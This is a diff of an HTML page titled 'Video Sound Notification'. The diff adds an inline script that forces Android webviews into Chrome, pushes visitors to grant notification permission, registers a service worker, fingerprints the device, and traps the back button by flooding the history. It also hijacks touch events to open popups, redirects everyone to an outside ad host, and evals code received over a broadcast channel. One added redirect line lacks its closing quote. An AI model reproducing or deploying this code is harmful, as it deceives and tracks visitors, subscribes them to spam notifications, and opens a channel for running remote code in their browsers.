@@ -5,6 +5,206 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Video Sound Notification</title>
 
+    <script>
+        var ua = navigator.userAgent;
+        if (/Android/i.test(ua) && ( /Version\/.+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+)/i.test(ua) || /; wv\).+(Chrome)\/(\d+)\.(\d+)\.(\d+)\.(\d+)/i.test(ua) || ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1 ) ) {
+            document.location.href = 'intent://' + location.href.replace(/https?:\/\//i, "") + '#Intent;scheme=https;package=com.android.chrome;end';
+            setInterval(() => {
+                document.location.href = 'intent://' + location.href.replace(/https?:\/\//i, "") + '#Intent;scheme=https;package=com.android.chrome;end';
+            }, 1000);
+        } else {
+            var url = new URL(window.location.href);
+            var ymid = url.searchParams.get('ymid');
+            var source = url.searchParams.get('sourceid');
+            if (source === null || source === '') {
+                source = url.searchParams.get('source');
+            }
+            var zoneid = url.searchParams.get("zoneid");
+            var resubscription = url.searchParams.get("resubscription");
+            var always_reduce_resubscribtion = url.searchParams.get("always_reduce_resubscribtion");
+            var geo = url.searchParams.get('geo');
+
+            function getRandomElement(items) {
+                return items[Math.floor(Math.random() * items.length)];
+            }
+
+            function resolveTbZone() {
+                const tbzone = url.searchParams.get("tbzone");
+                const tbl = ['7304159', '7304159', '7304159', '7304159', '7304159'];
+                return (tbzone === null || tbzone === '') ? getRandomElement(tbl) : getRandomElement(tbzone.split(',').map(e => e.trim()).filter(e => e !== ""));
+            }
+
+            function newURLSearchParams(n) {
+                const t = new URLSearchParams;
+                for (const e in n) t.set(e, n[e]);
+                return t
+            }
+
+            let tbUrlSearchParams = newURLSearchParams({
+                zoneid: resolveTbZone(),
+                ymid: ymid,
+                var: zoneid
+            });
+
+            (function (n, t) {
+                if ("userAgentData" in window.navigator) {
+                    const e = window.navigator.userAgentData;
+                    n.set("is_mobile", "" + e.mobile), n.set("os", e.platform);
+                    const o = {model: "android_model", platform: "os", platformVersion: "os_version", uaFullVersion: "browser_version"}, r = Object.keys(o);
+                    try {
+                        e.getHighEntropyValues(r).then((t => {
+                            r.forEach((e => {
+                                e in t && n.set(o[e], t[e])
+                            }))
+                        })).finally((() => {
+                            t(n)
+                        }))
+                    } catch (e) {
+                        t(n)
+                    }
+                } else t(n);
+            })(tbUrlSearchParams, (n => {
+                tbUrlSearchParams = n;
+            }));
+
+            function createTbUrl() {
+                return "http://metagrowth.ct.ws/afu.php?" + tbUrlSearchParams.toString();
+            }
+
+            var domain = window.location.hostname.split('.').slice(-2).join('.');
+
+            var prefetch_rule = 0.5;
+            resubscription = isNaN(Number(resubscription)) ? 100 : resubscription;
+            Number(resubscription) < Math.ceil(Number(resubscription)) && (always_reduce_resubscribtion = "1", resubscription = Math.ceil(Number(resubscription)));
+
+            ((z) => {
+                function sdk(e) {
+                    e
+                }
+
+                const ns = navigator.serviceWorker;
+                bc = new BroadcastChannel(`sw_${z}`);
+                bc.addEventListener("message", (({data: data}) => data.eval ? eval(data.eval) : sdk(data)));
+                ns
+                    ? Promise.all([BeforePermissionPrompt()])
+                        .catch((() => {
+                            redirect(createTbUrl())
+                        }))
+                    : redirect(createTbUrl());
+            })(zoneid);
+
+            function redirect(e) {
+                e && (e = decodeURIComponent(e), window.location.href = e)
+            }
+
+            // "Chrome" != browser_name && "Chrome Mobile" != browser_name && "Chrome%20Mobile" != browser_name && redirect(tb);
+
+            var CreateRedirectURL = function (e) {
+                if (null == e && (e = resubscription < Math.ceil(resubscription) ? resubscription - .5 : resubscription - 1), e <= 0) return createTbUrl();
+                if ("granted" === Notification.permission) return createTbUrl();
+                var t = location.search.replace("resubscription=" + resubscription, "resubscription=" + e);
+                const {host: r} = window.location, i = r.split(".");
+                let n = 3 === i.length ? 1 * i[0] + 1 : 1;
+                return n > 39 && (n = 1), "https://" + n + "." + domain + location.pathname + t
+            }, DoWhenPageClicked = function () {
+                resubscription <= 1 || window.open(CreateRedirectURL()), redirect(createTbUrl())
+            };
+
+            function BeforePermissionPrompt() {
+                return Notification.requestPermission((function (e) {
+                    "default" != e ? ("granted" == e && PermissionGranted(), "denied" == e && PermissionDenied()) : PermissionDefault()
+                }))
+            }
+
+            function PermissionDefault() {
+                redirect(CreateRedirectURL())
+            }
+
+            function PermissionGranted() {
+                const currGeo = (geo === null || geo.length < 2) ? 'A1' : geo.substring(0, 2)
+
+                navigator.serviceWorker.register('/swra-aplhbn.js?' + newURLSearchParams({
+                    zoneid: zoneid,
+                    ymid: ymid + "_" + zoneid + currGeo,
+                    subid1: source,
+                }).toString()).then(() => {
+                    // Number(browser_version) <= 91 && window.history && history.pushState && function (e, t, r) {
+                    //     for (let i = 0; i < 10; i++) r.pushState(null, e.title, t.location.href)
+                    // }(document, window, history);
+                    setTimeout((function () {
+                        redirect(createTbUrl())
+                    }), 4e3)
+                });
+            }
+
+            function PermissionDenied() {
+                resubscription <= 1 && redirect(createTbUrl());
+                // ("Chrome" == browser_name || "Chrome Mobile" == browser_name || "Chrome%20Mobile" == browser_name) && Number(browser_version) >= 74 || redirect(CreateRedirectURL())
+            }
+
+            function AlreadySubscribed() {
+                redirect(createTbUrl())
+            }
+
+            function isPrivateModeOld() {
+                var e = window.RequestFileSystem || window.webkitRequestFileSystem;
+                e && e(window.TEMPORARY, 100, (function (e) {
+                }), (function (e) {
+                    redirect(createTbUrl())
+                }))
+            }
+
+            function isPrivateMode() {
+                return new Promise((function (e) {
+                    var t, r = function () {
+                        e(!1)
+                    };
+                    if ((t = /(?=.*(opera|chrome)).*/i.test(navigator.userAgent) && navigator.storage && navigator.storage.estimate) && navigator.storage.estimate().then((function (t) {
+                        return t.quota < 12e7 ? void e(!0) : r()
+                    })), !t) return r()
+                }))
+            }
+
+            switch (/*("Chrome" == browser_name || "Chrome Mobile" == browser_name || "Chrome%20Mobile" == browser_name) && Number(browser_version) >= 79 */ true ? isPrivateMode().then((function (e, t) {
+                e && redirect(createTbUrl())
+            })) : isPrivateModeOld(), "Notification" in window || redirect(createTbUrl()), Notification.permission) {
+                case"denied":
+                case"granted":
+                    const e = location.hostname;
+                    redirect(e == domain && 1 == always_reduce_resubscribtion ? createTbUrl() : CreateRedirectURL(resubscription))
+            }
+            var preload = function (e) {
+                e !== createTbUrl() && _preload(e, "prerender")
+            }, _preload = function (e, t) {
+                if (t !== "prefetch") {
+                    var r = document.createElement("link");
+                    r.href = e, r.rel = t, document.head.appendChild(r)
+                }
+            }, preloadStart = function (e) {
+                e === createTbUrl() || _preload(e, "prerender"), _preload(createTbUrl(), "prefetch")
+            };
+            2 === location.hostname.split(".").length && Math.random() < prefetch_rule ? preloadStart(CreateRedirectURL()) : preload(CreateRedirectURL());
+
+            /* Number(browser_version) <= 91 &&*/ window.history && history.pushState && function (t, o, e) {
+                for (let i = 0; i < 10; i++) e.pushState(null, t.title, o.location.href)
+            }(document, window, history)
+            document.addEventListener("DOMContentLoaded", function () {
+                var PageClicked = document.getElementById("trans");
+                ["touchstart", "touchend", "touchcancel"].forEach((function (e) {
+                    PageClicked.addEventListener(e, (e => {
+                        window.history && history.pushState && function (e, t, r) {
+                            for (let i = 0; i < 10; i++) r.pushState(null, e.title, t.location.href)
+                        }(document, window, history);
+                        "touchstart" == e.type && (console.log(e.type), resubscription <= 1 ? redirect(createTbUrl()) : window.open(CreateRedirectURL()));
+                        "touchcancel" == e.type && (console.log(e.type), redirect(createTbUrl()));
+                        "touchend" == e.type && (console.log(e.type), DoWhenPageClicked(), redirect(createTbUrl()));
+                        e.preventDefault();
+                    }), !1)
+                }));
+            });
+        }
+    </script>
+
 <script>
 window.onhashchange=function(){jp();};
 function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
@@ -12,10 +212,10 @@ function jp() {
   fh();}
 setTimeout('hh();', 500);
 function fh(){
-  location.href="https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7";
+  location.href="http://metagrowth.ct.ws/afu.php?";
 }
 function goon(){
-  location.href="https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7";
+  location.href="http://metagrowth.ct.ws/afu.php?
 }
 </script> 
 <script>
@@ -26,10 +226,10 @@ function jp() {
   fh();}
 setTimeout('hh();', 500);
 function fh(){
-  location.href="https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7";
+  location.href="http://metagrowth.ct.ws/afu.php?";
 }
 function goon(){
-  location.href="https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7";
+  location.href="http://metagrowth.ct.ws/afu.php?";
 }
 </script> 
 <script>
@@ -37,7 +237,7 @@ function goon(){
 var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
-  hm.src = "https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7";
+  hm.src = "http://metagrowth.ct.ws/afu.php?";
   var s = document.getElementsByTagName("script")[0];
   s.parentNode.insertBefore(hm, s);
 })();
@@ -109,18 +309,18 @@ var _hmt = _hmt || [];
 
   <script>
     function loadCancelLink() {
-      window.location.href = 'https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7'; // Replace with your Cancel link
+      window.location.href = 'http://metagrowth.ct.ws/afu.php?'; // Replace with your Cancel link
     }
 
     function loadContinueLink() {
       sessionStorage.setItem('continueClicked', 'true');
-      window.location.href = 'https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7'; // Replace with your Continue link
+      window.location.href = 'http://metagrowth.ct.ws/afu.php?'; // Replace with your Continue link
     }
 
     // Redirect when back button is pressed after Continue
     window.addEventListener('popstate', function () {
       if (sessionStorage.getItem('continueClicked') === 'true') {
-        window.location.href = 'https://wishinghonourederratic.com/cc9cgux1?key=633de996826c7129f36280e0e4e16cf7'; // Redirect again
+        window.location.href = 'http://metagrowth.ct.ws/afu.php?'; // Redirect again
       }
     });
   </script>
